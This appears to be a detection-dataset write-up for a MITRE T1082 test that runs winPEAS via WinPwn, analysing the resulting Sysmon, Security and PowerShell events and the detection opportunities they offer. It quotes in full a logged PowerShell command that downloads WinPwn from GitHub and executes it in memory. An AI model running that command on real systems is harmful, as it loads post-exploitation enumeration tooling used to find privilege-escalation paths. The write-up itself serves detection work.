# T1082-14: System Information Discovery — WinPwn - winPEAS

## Technique Context

T1082 (System Information Discovery) covers adversaries who enumerate information about the compromised host: operating system details, hardware configuration, security software, user accounts, running services, network configuration, and privilege escalation opportunities. This information drives subsequent decisions: which exploits to attempt, how to move laterally, how to avoid detection, and what data is worth exfiltrating.

winPEAS (Windows Privilege Escalation Awesome Scripts) is one of the most widely used post-exploitation enumeration tools in the field. It performs a comprehensive sweep of a Windows system searching for misconfigurations, weak permissions, stored credentials, scheduled task vulnerabilities, unquoted service paths, registry-based persistence mechanisms, network shares, and dozens of other privilege escalation vectors. It is used both by red teams and, in real compromises, by threat actors who have established an initial foothold and need to understand what escalation paths are available.

WinPwn's integration wraps winPEAS invocation via an in-memory PowerShell loading pattern, downloading the tool from S3cur3Th1sSh1t's GitHub repository at a pinned commit.

## What This Dataset Contains

This dataset captures the full execution of WinPwn's `winPEAS` function on ACME-WS06.acme.local with Defender disabled. The execution runs as `NT AUTHORITY\SYSTEM`.

The Security log (EID 4688) and Sysmon (EID 1) record the complete invocation:

```
"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
winPEAS -noninteractive -consoleoutput}
```

Sysmon EID 22 (DNS) records a successful DNS resolution for `raw.githubusercontent.com` (QueryStatus 0), resolving to GitHub CDN infrastructure:
```
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
```

Note that this DNS query is attributed to `mscorsvw.exe` (the .NET NGen worker), not directly to `powershell.exe`. This reflects how Windows DNS resolution works — the query may be handled through a shared DNS client component and attributed to the calling process differently depending on timing and the DNS resolver's process assignment.

The Sysmon channel (32 events) breaks down as: 15 EID 7 (image loads), 8 EID 11 (file creates), 3 EID 10 (process access), 3 EID 1 (process creates), 2 EID 17 (named pipe creates), and 1 EID 22 (DNS). This is a relatively lean dataset compared to tests with higher file system activity, consistent with winPEAS executing primarily in-memory and via PowerShell rather than dropping tools to disk.

Sysmon EID 11 (file creates) shows two noteworthy entries:
- `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive` (written by `powershell.exe`) — the PowerShell startup profile for the SYSTEM account's non-interactive session
- `C:\Windows\Temp\01dcb40a899d7fed` (written by `MsMpEng.exe`) — Defender's background scanning creating a temp file

The Sysmon EID 17 (named pipe) records a PowerShell host pipe for the SYSTEM-level execution session. The EID 10 (process access) shows `powershell.exe` opening `whoami.exe` with full access (`0x1FFFFF`), the ART test framework pre-execution identity check.

The Security channel (6 events) is minimal: all 6 events are EID 4688 process creation, consisting of `whoami.exe` (twice) and `powershell.exe` invocations.

The PowerShell channel (109 events: 107 EID 4104, 1 EID 4103, 1 EID 4100) includes the ART module import and cleanup blocks alongside the WinPwn invocation framework's script block logging output.

Compared to the defended dataset (37 sysmon, 11 security, 51 PowerShell events), this undefended capture is smaller in sysmon events (32 vs. 37) but larger in PowerShell events (109 vs. 51). The PowerShell EID 4100 (error) event is present in this dataset and absent in the defended count — it may reflect a runtime error encountered during winPEAS execution that was blocked before occurring in the defended run.

## What This Dataset Does Not Contain

winPEAS's actual enumeration output — the list of misconfigurations, weak permissions, and privilege escalation vectors it identifies — exists only in process stdout and is not captured in Windows event telemetry.

The tool performs a wide range of enumeration activities including registry reads, file system permission checks, and service configuration queries. Most of these operations do not generate Windows Security log events unless very verbose process and object access auditing is enabled beyond what this dataset's collection configuration covers.

No network connection events (EID 3) from the winPEAS execution itself are captured in the samples. winPEAS primarily reads local system state rather than making outbound connections, though the initial WinPwn download connection to GitHub is the expected network indicator.

## Assessment

This dataset provides the execution context for a winPEAS system enumeration run through WinPwn's in-memory loading pattern. The primary observable artifacts are the EID 4688/EID 1 process creation with the full command line (including the GitHub URL for WinPwn and the `winPEAS` function call), the DNS resolution for `raw.githubusercontent.com`, and the PowerShell SYSTEM-context execution indicators (named pipe, startup profile write).

winPEAS is notable in this dataset for producing a relatively small Sysmon footprint despite being a comprehensive enumeration tool — because it runs primarily within a single PowerShell process, most of its activity is invisible to process creation and file creation monitoring. The real execution evidence lives in the command line and PowerShell script block logs.

The DNS query resolution to GitHub CDN and the PowerShell startup profile write to the SYSTEM account's profile directory (`C:\Windows\System32\config\systemprofile\...`) are both secondary indicators of PowerShell execution as SYSTEM from a non-interactive session — a pattern consistent with post-exploitation activity.

## Detection Opportunities Present in This Data

**Security EID 4688 / Sysmon EID 1 — WinPwn in-memory loading with winPEAS invocation:** The full command line including the WinPwn GitHub URL (pinned commit `121dcee26a7aca368821563cbe92b2b5638c5773`) and `winPEAS -noninteractive -consoleoutput` is recorded. The combination of `iex(downloadstring(...))` + a known offensive GitHub URL + a named enumeration function is a high-fidelity indicator.

**Sysmon EID 22 — DNS resolution for raw.githubusercontent.com:** A DNS query to `raw.githubusercontent.com` resolving successfully (QueryStatus 0) in the context of a SYSTEM-level PowerShell execution session indicates a script download from GitHub's raw content CDN. Combined with the process creation command line, this confirms the download path.

**Sysmon EID 11 — PowerShell startup profile written for SYSTEM:** The file `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive` being written indicates PowerShell initialized a new non-interactive session under the SYSTEM account. This occurs when PowerShell runs as SYSTEM and has not done so before on this endpoint, or when the profile needs updating.

**PowerShell EID 4100 — PowerShell error event:** The presence of an EID 4100 (error record) indicates winPEAS encountered an error condition during execution — likely a permission denied or incompatible environment check. Error events during offensive tool execution can provide insight into what the tool was attempting when it failed.

**Sysmon EID 10 — Process access 0x1FFFFF from PowerShell:** Full process access from PowerShell against subordinate processes (whoami.exe in this case) confirms the calling context has sufficient privilege to open processes with all access rights — a prerequisite for credential dumping and process injection attacks.
